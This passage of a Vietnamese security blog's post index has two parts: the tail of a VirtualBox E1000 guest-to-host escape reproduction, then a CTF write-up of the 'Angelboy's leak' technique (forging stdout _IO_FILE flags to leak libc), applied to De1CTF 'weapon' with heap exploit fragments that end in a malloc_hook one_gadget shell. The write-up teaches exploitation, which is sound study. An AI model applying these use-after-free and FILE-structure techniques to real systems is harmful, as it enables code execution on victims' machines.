khỏi vòng lặp. Transcriptor data_3 có data_3.end_of_packet == true tất yếu sẽ hủy vòng lặp trong khi còn 2 descriptor còn lại là chưa được xử lý, tại sao điều này lại quan trọng, thì tất cả các context descriptor đều được đọc sau khi đã xử lý xong data descriptor. Context descriptor được xử lý trong suốt quá trình TCP Segmentation Context Update ở trong hàm e1kLocateTxPacket() và data descriptor được xử lý sau đó tại bên trong vòng lặp của hàm e1kXmitPacket(). Người lập trình hướng theo như vậy với mục đích ngăn cản sự thay đổi giá trị của biến u16MaxPktLen trước khi một số data được thực thi để ngăn cản bug interger underflow tại hàm e1kFallbackAddToFrame():\nuint32_t cb = u16MaxPktLen - pThis-\u0026gt;u16TxPktLen Nhưng vẫn có cách để bypass cơ chế bảo vệ này\n","date":"28 November 2022","externalUrl":null,"permalink":"/posts/virtualbox_e1000_0day_reproduce/","section":"Posts","summary":"VirtualBox E1000 Guest-to-Host Escape. But it not done yet \u0026hellip;.","title":"Virtualbox e1000 0day Reproduce","type":"posts"},{"content":"","date":"16 September 2022","externalUrl":null,"permalink":"/tags/technique/","section":"Tags","summary":"","title":"Technique","type":"tags"},{"content":" :memo: Tản mạn một xíu về technique trên? # Libc là gì :rocket: # (nếu như các bạn đã biết libc là gì và biết technique ret2libc thì có thể bỏ qua phần này) Đối với một số bạn chơi Pwnable nói riêng và các bạn chơi CTF nói chung thì đã ít nhiều nghe đến cụm từ \u0026ldquo;Libc\u0026rdquo;. Vậy libc là gì? \u0026quot;Cụm từ \u0026quot;libc\u0026quot; thường được dùng như là một từ viết tắt cho \u0026quot;standard C library\u0026quot;, một thư viện các hàm cái mà có thể dùng bởi tất cả C programs\u0026quot;\nVậy có nghĩa, địa chỉ gốc của libc rất là quan trọng, khi bạn đã có địa chỉ gốc của libc bạn có thể làm rất là nhiều thứ, điển hình nhất là bạn có thể dùng one_gadget để execve(\u0026rsquo;/bin/sh\u0026rsquo;,0,0) hoặc là gọi system(\u0026rsquo;/bin/sh\u0026rsquo;),\u0026hellip;.. Nôm na cuối cùng libc dùng để pop a shell. Để có thể đối phó với vấn đề trên, một số challenge\u0026rsquo;s author sẽ không cho bất cứ function(puts, printf,\u0026hellip;.) để có thể leak ra địa chỉ của libc. How this technique works? :face_with_monocle: # Mình không chắc ai là người tạo ra technique này nhưng mà lần đầu tiên mình thấy nó được áp dụng vào trong ctf là vào giải HITCON 2018 câu babytcache của angelboy.tw, sau đó anh ấy có publish solution cho câu này tại đây: github.com/scwuaptx/CTF/blob/master/2018-writeup/hitcon/baby_tcache.py\nVậy nên technique này yang hồ hay gọi là: Angelboy\u0026rsquo;s leak Technique này sẽ giải quyết vấn đề thay đổi cấu trúc stdout của IO_FILE để có thể biến nó thành hàm puts để leak địa chỉ của libc. Nó thay đổi cấu trúc của stdout của IO_FILE bằng cách modify flag bit của stdout thành 0xfbad1800 và khiến cho byte cuối của _IO_write_base nhỏ lại. Ở bên dưới mình sẽ nói tại sao modify flag bit của stdout thành 0xfbad1800.\nĐầu tiên ta phải hiểu hàm puts hoạt động ra sao :face_with_raised_eyebrow: # Một cái ví dụ cơ bản về hàm puts gọi trong libc, thì mình sẽ dùng một chương trình in ra \u0026ldquo;Hello world\u0026rdquo;, một chương trình từ thuở sơ khai ai cũng phải tiếp xúc trong cái bộ môn này.\n#include \u0026lt;stdio.h\u0026gt; void main() { printf(\u0026#34;Hello World\\n); } Ở các version sau này của libc thì khi compile ở assembly code thì nó sẽ gọi trực tiếp đến hàm printf luôn nhưng mà ở các libc cũ thì nó sẽ gọi đến hàm puts nhưng mà điều đó vẫn không quan trọng cho lắm\n.file \u0026#34;hello.c\u0026#34; .section .rodata .LC0: .string \u0026#34;Hello World!\u0026#34; .text .globl main .type main, @function main: pushq %rbp movq %rsp, %rbp movl $.LC0, %edi call puts popq %rbp ret Tiếp theo thì ta sẽ xem hàm puts làm gì ở libc-2.31 (phiên bản mà mình đang sử dụng hiện tại) Thực tế thì codebase của glibc rất là rộng và cách hoạt động của nó nằm ở phạm vị vĩ mô, vì thế nên rất khó để có thể định hướng được mục tiêu mà mình cần. Khi nhìn vào codebase ta có thể thấy weak_alias (_IO_puts, puts) ở trong file libio/ioputs.c. Ở trong glibc, điều này có nghĩa là bất kỳ ai khi gọi hàm puts thì thực tế thay vào đó sẽ gọi IO_puts Hàm IO_puts như sau\nint _IO_puts (const char *str) { int result = EOF; size_t len = strlen (str); _IO_acquire_lock (_IO_stdout); if ((_IO_vtable_offset (_IO_stdout) != 0 || _IO_fwide (_IO_stdout, -1) == -1) \u0026amp;\u0026amp; _IO_sputn (_IO_stdout, str, len) == len \u0026amp;\u0026amp; _IO_putc_unlocked (\u0026#39;\\n\u0026#39;, _IO_stdout) != EOF) result = MIN (INT_MAX, len + 1); _IO_release_lock (_IO_stdout); return result; } Mớ ở trên chúng ta không cần phải để ý tất cả mà chỉ cần focus vô hàm IO_sputn. Hàm IO_sputn được định nghĩa tại libio/libioP.h, line 374 (as a macro) Đào sâu vào trong ta thấy nó là 1 nùi các macro nhìn mà không thấy đường ra Sau một hồi mắt mình đảo như rang lạc thì mình đã tìm ra được một cái function liên quan đến vấn đề mà chúng ta đang đề cập, đó chính là _IO_new_file_xsputn được mô tả tại libio/libioP.h, line 596 (as a prototype) Sau một thời gian mò mẫm code của hàm _IO_new_file_xsputn thì cuối cùng nó cũng đã dừng lại tại hàm _IO_OVERFLOW được defined tại libio/libioP.h, line 141 (as a macro) (Làm cái mớ này mình cũng đang không biết đang làm mics hay làm pwn nữa \u0026hellip; :confused:) Và cuối cùng thì đây chính là cái mà chúng ta đang cần tìm:\nint _IO_new_file_overflow (FILE *f, int ch) { if (f-\u0026gt;_flags \u0026amp; _IO_NO_WRITES) /* SET ERROR */ { f-\u0026gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; } /* If currently reading or no buffer allocated. */ if ((f-\u0026gt;_flags \u0026amp; _IO_CURRENTLY_PUTTING) == 0 || f-\u0026gt;_IO_write_base == NULL) { /* Allocate a buffer if needed. */ if (f-\u0026gt;_IO_write_base == NULL) { _IO_doallocbuf (f); _IO_setg (f, f-\u0026gt;_IO_buf_base, f-\u0026gt;_IO_buf_base, f-\u0026gt;_IO_buf_base); } if (__glibc_unlikely (_IO_in_backup (f))) { size_t nbackup = f-\u0026gt;_IO_read_end - f-\u0026gt;_IO_read_ptr; _IO_free_backup_area (f); f-\u0026gt;_IO_read_base -= MIN (nbackup, f-\u0026gt;_IO_read_base - f-\u0026gt;_IO_buf_base); f-\u0026gt;_IO_read_ptr = f-\u0026gt;_IO_read_base; } if (f-\u0026gt;_IO_read_ptr == f-\u0026gt;_IO_buf_end) f-\u0026gt;_IO_read_end = f-\u0026gt;_IO_read_ptr = f-\u0026gt;_IO_buf_base; f-\u0026gt;_IO_write_ptr = f-\u0026gt;_IO_read_ptr; f-\u0026gt;_IO_write_base = f-\u0026gt;_IO_write_ptr; f-\u0026gt;_IO_write_end = f-\u0026gt;_IO_buf_end; f-\u0026gt;_IO_read_base = f-\u0026gt;_IO_read_ptr = f-\u0026gt;_IO_read_end; f-\u0026gt;_flags |= _IO_CURRENTLY_PUTTING; if (f-\u0026gt;_mode \u0026lt;= 0 \u0026amp;\u0026amp; f-\u0026gt;_flags \u0026amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) f-\u0026gt;_IO_write_end = f-\u0026gt;_IO_write_ptr; } if (ch == EOF) return _IO_do_write (f, f-\u0026gt;_IO_write_base, f-\u0026gt;_IO_write_ptr - f-\u0026gt;_IO_write_base); if (f-\u0026gt;_IO_write_ptr == f-\u0026gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; *f-\u0026gt;_IO_write_ptr++ = ch; if ((f-\u0026gt;_flags \u0026amp; _IO_UNBUFFERED) || ((f-\u0026gt;_flags \u0026amp; _IO_LINE_BUF) \u0026amp;\u0026amp; ch == \u0026#39;\\n\u0026#39;)) if (_IO_do_write (f, f-\u0026gt;_IO_write_base, f-\u0026gt;_IO_write_ptr - f-\u0026gt;_IO_write_base) == EOF) return EOF; return (unsigned char) ch; } Để có thể giải thích cái hàm trên thì chắc đến mùa quýt mình mới giải quyết được vấn đề này mất, chúng ta hãy focus vào hàm _IO_do_write thì nó chính là hàm cuối cùng được gọi và _IO_write_base chính là tham số cuối cùng mà chúng ta cần modify. Để có thể chạm được đến hàm if cuối cùng thì chúng ta cần phải bypass tất cả hàm if ở trên, chúng ta không muốn phải vướng vào một trong các nhánh của hàm if đó đâu. Quay về bên trên cùng, chúng ta sẽ bypass từng hàm if một.\nỞ hàm if đầu tiên cái giá trị f-\u0026gt;flag \u0026amp; _IO_NO_WRITES phải là 0, để không dính vào bên trong hàm if. Tiếp theo chúng ta phải set f-\u0026gt;flag \u0026amp; _IO_CURRENTLY_PUTTING bằng 1 để không vào bên trong hàm if thứ 2 Đào sâu một tí vào hàm _IO_do_write thì ta sẽ thấy một hàm nữa chạy cùng với hàm trên đó là _IO_new_do_write static size_t new_do_write (FILE *fp, const char *data, size_t to_do) { size_t count; if (fp-\u0026gt;_flags \u0026amp; _IO_IS_APPENDING) fp-\u0026gt;_offset = _IO_pos_BAD; else if (fp-\u0026gt;_IO_read_end != fp-\u0026gt;_IO_write_base) { off64_t new_pos = _IO_SYSSEEK (fp, fp-\u0026gt;_IO_write_base - fp-\u0026gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-\u0026gt;_offset = new_pos; } count = _IO_SYSWRITE (fp, data, to_do); //our aim ... return count; } Và đây chính là mục tiêu cuối cùng của chúng ta (hoặc thứ gì đó xêm xêm) _IO_SYSWRITE (fp, data, to_do) Sau khi lược qua các hàm if thì để có thể bypass tất cả các hàm if trên là bất khả thi(nhiều lí do khó có thể mà khai thác được, có một cái vấn đề mà chúng ta không thể control nó được đó là fp-\u0026gt;_IO_write_base - fp-\u0026gt;_IO_read_end. Nếu như chúng ta set fp-\u0026gt;_IO_read_end thành 0, dẫn tới hậu quả là tham số thứ 2 sẽ quá dài, và nếu ta set fp-\u0026gt;_IO_write_base \u0026gt; fp-\u0026gt;_IO_read_end thì chúng ta sẽ dính lỗi ở 1 chỗ khác, tại vì _IO_write_base sẽ trở nên lớn hơn _IO_write_ptr mà cái ta cần là _IO_write_base phải nhỏ hơn _IO_write_ptr), dường như chúng ta chỉ có lựa chọn skip qua hàm else if, để hiện thực hóa điều này thì ta cần focus vàofp-\u0026gt;_IO_write_base và fp-\u0026gt;_IO_read_end, dựa vào source code trên thì ta có thể suy ra được đó là ta phải set fp-\u0026gt;flags \u0026amp; _IO_is_appending\nInconclusion # _IO_file được bao gồm trong _IO_FILE_plus có cấu trúc như bên dưới:\nstruct _IO_FILE_plus { _IO_FILE file; const struct _IO_jump_t *vtable; }; _IO_FILE được định nghĩa dưới dạng linked list, đầu node của list trên là _IO_list_all. Tóm tắt sơ qua thì IO_list_all sẽ trỏ đến stderr (file descriptor là 2) tiếp theo sẽ trỏ đến stdout(file descriptor là 1) và cuối cùng trỏ đến stdin(file descriptor là 0). Dưới đây là những giá trị cần thiết cho việc bypass toàn bộ những hàm if ở bên trên và đạt đến mục tiêu cuối cùng.\n_flags = 0xfbad0000 //magic number _flags \u0026amp;= _IO_NO_WRITE //flag = 0xfbad0000 _flag |= _IO_CURRENTLY_PUTTING //flag = 0xfbad0800 _flag |= _IO_IS_APPENDING //flag = 0xfbad1800 Vậy tất cả những gì chúng ta cần làm đó chính là set stdout-\u0026gt;flags thành 0xfbad1800 và để leak mà thứ chúng ta cần thì chúng ta phải tính toán offset cụ thể để có thể ghi đè, cụ thể ở đây đó chính là cái chức năng mà ta output ví dụ như là puts chẳng hạn phải dựa vào kết quả của IO_write_ptr - IO_write_base\nTrăm nghe thì không bằng một thấy, ở dưới mình demo technique trên bằng câu weapon của giải De1CTF\nWeapon # Analyze # Như một thói quen thì mọi challenge pwn thì mình sẽ luôn check file, checksec, check các lỗi cơ bản, v\u0026hellip;v.. Nhìn vào thì đề bài cho một file ELF 64-bit, bị stripped và full mitigation (full đồ full giáp \u0026hellip;.) \u0026ldquo;Là một thằng đàn ông thì không chùn bước trước mọi thử thách\u0026rdquo;\nĐề cho ta 1 vòng lặp, trong đó có 3 function cơ bản của 1 bài heap: Create, delete và không được cung cấp hàm in để tránh leak libc address hoặc những address quan trọng, bù lại ta được hàm rename một weapon(chắc chắn sẽ có ích trong lương lai)\nHàm Create: Đơn giản chỉ là nhập size của một chunk, index và data của chunk đó thông qua biến name. Hàm Delete: Tương tự như mọi đề heap khác, chỉ định free một chunk đã có sẵn thông qua biến index Hàm rename: Thay đổi nội dung của một chunk chỉ định thông qua biến index. Nhìn kỹ hơn bằng ida(mình đã thay đổi tên biến và một số tên hàm để nhìn hiểu rõ hơn)\nHàm main như mình đã nói ở trên :arrow_up: Hàm Create: Bài này chỉ giới hạn size của một chunk trong khoảng 0 đến 96, vì libc bài này cho chỉ là phiên bản libc-2.23 vậy nên sẽ không có tcache mà bài này chỉ gói gọn trong fastbin, tuy bị giới hạn trong fastbin nhưng dường như bài này không có giới hạn số lượng chunk được cho phép.\nHàm Delete: Bug nằm ở trong hàm delete này, bất cứ một người chơi pwn nào khi nhìn vào hàm này cũng sẽ nhận ra được bug :lol: Bug ở đây đó là hàm này không set pointer về null dẫn đến lỗi use-after-free hoặc là double free, có rất là nhiều cách để tận dụng hai lỗi này.\nỞ bài này ta có thể tận dụng lỗi uaf tạo ra chunk overlapped để hình thành unsorted bin sau đó ghi đè fd một chunk để leak libc, ngoài ra thì ta có thể tận dụng lỗi uaf để hướng đến cấu trúc stdout, modify flags bit để leak libc, vì bài này không có hàm in ra nên mình sẽ kết hợp cả hai cách trên để có thể leak ra được flag.\nMình không biết bài này rốt cuộc bị cái gì, nhưng mà làm ở local dùng env libc-2.23.so thì bị lỗi timeout, còn nếu dùng env ở máy mình thì không tận dụng bug ở trên được ,mình ngồi loay hoay sửa gần cả tiếng vẫn không fix được :sadge_pepe:. Vậy nên mình sẽ nói sơ qua về ý tưởng exploit và mình để script exploit ở bên dưới, còn nếu bạn muốn thì bạn hãy debug để hình dung technique trên hoạt động ra sao, I\u0026rsquo;m so sorry :(\nHướng exploit # Đầu tiên thì fd pointer của fastbin sẽ trỏ đến libc cụ thể là main_arena + 88, nhưng bởi vì size được cho phép phải nhỏ hơn 0x60 nên không thể trực tiếp lấy được địa chỉ của libc thông qua fd pointer, thay vào đó ta sẽ tận dụng lỗi uaf, thông qua bug trên thì ta có thể đẩy 1 chunk vào fastbin, sau đó ta có thể fake một chunk với size tương thích với size của unsorted_bin, sau đó free chunk đó một lần nữa, kết quả là chunk mà chúng ta fake sẽ nằm trong fastbin và unsorted_bin, ngoài ra fd pointer sẽ trỏ đến libc. Sau khi có được libc thì chỉ cần tận dụng lỗi uaf ghi đè malloc_hook thành one_gadget để có được shell. Ý tưởng là như vậy.\nĐầu tiên thì mình sẽ alloc 3 chunk với size 0x70 và sau đó free hai chunk đầu tiên để tận dụng lỗi uaf với mục đích chồng chéo các chunk lên nhau cho bước tiếp theo đó là modify địa chỉ cần muốn. alloc(0,0x60,p64(0) + p64(0x71)) alloc(1,0x60,p64(0) + p64(0x51)) alloc(2,0x60,p64(0)*3 + p64(0x51)) delete(0) delete(1) rename(1,b\u0026#39;\\x10\u0026#39;) alloc(3,0x60,b\u0026#39;a\u0026#39;) # bây giờ fd của chunk 3 trỏ tới địa chỉ của chunk1+0x10 Bây giờ ta malloc chunk 4, sau đó rename chunk 4 để có thể modify size của chunk 1 bởi vì ta đã tạo 1 link giữa chunk 3 và chunk 1(fd chunk 3 -\u0026gt; chunk1 + 0x10) có nghĩa là khi ta modify chunk 3 thì ta đang modify chunk 1. Free chunk 1 để đẩy chunk 1 vào fastbin, thay đổi size sao cho size của chunk 1 tương thích với size của unsorted_bin. Kết quả ta thu lại được đó là chunk 1 đang nằm ở fastbin và unsorted_bin (Minh họa cho ý tưởng trên)\nalloc(4,0x60,p64(0)*0xb + p64(0x71)) delete(1) rename(4,p64(0)*0xb + p64(0x91)) delete(1) gdb.attach(r) Bây giờ thì ta chỉ cần modify 2 byte cuối fd pointer của chunk 1(main_arena + 88) nằm trong unsorted_bin thành địa chỉ mà ta muốn. Cái mà gần nhất với main_arena + 88 chính là _IO_2_1_stdout, chỉ có 4 byte cuối của hai địa chỉ mà ta nói ở trên là khác nhau Bởi vì aslr trên server được bật vì vậy nếu ta ghi đè 0x7fxxxxx5b78 thành 0x7fxxxxx6620 thì không khả thi vì 3 bits cuối 620 sẽ giữ nguyên, nhưng bit thứ 4 từ dưới lên(\u0026ldquo;6\u0026rdquo;) sẽ luôn random\nTìm kiếm một lúc thì có 1 địa chỉ phù hợp đó là 0x7fxxxxx25dd, vì bit 5dd(địa chỉ của fake chunk) giữ nguyên còn bit có giá trị \u0026ldquo;2\u0026rdquo; random thì ta có thể brute-force đến khi nào gặp được bit đó. Sau khi ta đã applied địa chỉ fd của 2 chunk(một cái nằm ở fastbin và cái còn lại ở unsorted_bin) có size 0x70 gần với địa chỉ của _IO_2_1_stdout bằng cách ghi đè địa chỉ của main_arena+88 thành 0x7fxxxx25dd thì ta sẽ fill biến flags của _IO_stdout thành 0xfbad1800 và 2 số cuối của _IO_write_base thành \\x00 sẽ khiến cho nó nhỏ hơn do đó ta sẽ leak được nhiều thứ hơn.\nrename(1,b\u0026#39;\\xdd\\x25\u0026#39;) alloc(5,0x60,b\u0026#39;a\u0026#39;) alloc(6,0x60,b\u0026#39;A\u0026#39;*0x33 + p64(0xfbad1800) + p64(0)*3 + b\u0026#39;\\x00\u0026#39;) Sau khi đã ghi đè thì struct của _IO_2_1_stdout sẽ như này\npwndbg\u0026gt; p _IO_2_1_stdout_ $2 = { file = { _flags = -72542208, //0xfbad1800 _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x7ffff7dd2600 \u0026lt;_IO_2_1_stderr_+192\u0026gt; \u0026#39;A\u0026#39; \u0026lt;repeats 32 times\u0026gt;, //ghi đè 2 số cuối thành \\x00 . . . }, vtable = 0x7ffff7dd06e0 \u0026lt;_IO_file_jumps\u0026gt; } Sau khi modified stdout thì khi chương trình gọi puts(ở lần tiếp theo) thì chương trình sẽ in ra địa chỉ của _IO_2_1_stderr vì nó nằm ở sau _IO_list_all (tỉ lệ 1/16 khi brute-force ta sẽ leak được địa chỉ của libc :lol:) Sau khi đã có libc base address thì ta có được địa chỉ gốc của malloc_hook, sau đó dùng theo phương pháp trên, ta malloc một chunk với size 0x60 để đẩy chunk đó vào fastbin, tiếp theo modify fd của chunk đó vào fake chunk mà ta muốn, ở đây đó là malloc_hook - 0x23. Malloc chunk đó lại để có được fake chunk ta muốn, sau đó malloc một chunk với size 0x60, fill bởi one_gadget. Cuối cùng malloc một chunk mới để trigger malloc_hook là có được shell.\n","date":"16 September 2022","externalUrl":null,"permalink":"/posts/technique_angelboy_leak/","section":"Posts","summary":"A technique for you to leak libc without output function","title":"Technique: Angelboy's Leak: using IO_FILE to leak libc","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]